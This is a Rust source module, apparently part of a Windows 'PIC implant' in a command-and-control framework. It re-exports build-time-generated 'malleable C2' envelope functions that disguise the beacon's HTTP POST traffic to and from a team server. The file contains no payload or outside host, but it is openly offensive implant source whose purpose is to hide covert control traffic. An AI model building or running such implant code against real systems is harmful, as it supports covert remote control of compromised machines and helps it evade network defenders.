//! Build-time-resolved malleable C2 envelopes for the PIC implant.
//!
//! `build.rs` parses `NYX_PROFILE` host-side (full std nyx-profile) and emits
//! `OUT_DIR/envelopes.rs` reconstructing the http-post **client** (request) and
//! **server** (response) envelope shapes as `nyx_profile::transform::{Step,
//! Terminator}`. This module re-exposes those baked values; `transport` applies
//! the client shape to each POST body before send and inverts the server shape
//! on each response. When `NYX_PROFILE` is unset, the baked fns return empty /
//! `None` and the transport sends raw frames (the pre-Phase-1 behaviour).
//!
//! Symmetric to the team server: it `encode`s the beacon→server *request* and
//! inverts the server→beacon *response*; the server does the mirror (it decodes
//! the request via `handle_beacon` and `encode`s the response via
//! `shape_beacon_response`). Both sides use the SAME `nyx_profile::transform`
//! engine — no duplication.

#![cfg(target_os = "windows")]

mod baked {
    include!(concat!(env!("OUT_DIR"), "/envelopes.rs"));
}

pub use baked::{
    post_client_headers, post_client_steps, post_client_terminator, post_server_steps,
    post_server_terminator, POST_CLIENT_UA,
};
